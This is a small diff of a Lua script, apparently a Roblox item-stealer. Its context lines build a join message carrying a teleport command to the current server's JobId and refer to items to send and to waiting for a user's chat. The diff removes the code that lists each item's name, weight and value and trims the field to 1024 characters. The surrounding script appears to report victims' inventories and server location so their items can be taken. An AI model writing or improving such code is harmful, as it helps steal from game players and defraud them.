@@ -146,22 +146,6 @@ local function SendJoinMessage(list, prefix)
         }
     }
 
-    for _, item in ipairs(list) do
-        local line = string.format("%s (%.2f KG): ¢%s", item.Name, item.Weight, formatNumber(item.Value))
-        fields[3].value = fields[3].value .. line .. "\n"
-    end
-
-    if #fields[3].value > 1024 then
-        local lines = {}
-        for line in fields[3].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
-        end
-
-        while #fields[3].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
-        end
-    end
 
     local data = {
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. game.JobId .. "')",
@@ -367,6 +351,7 @@ if #itemsToSend > 0 then
     waitForUserChat()
 
 end
+
 
 
 
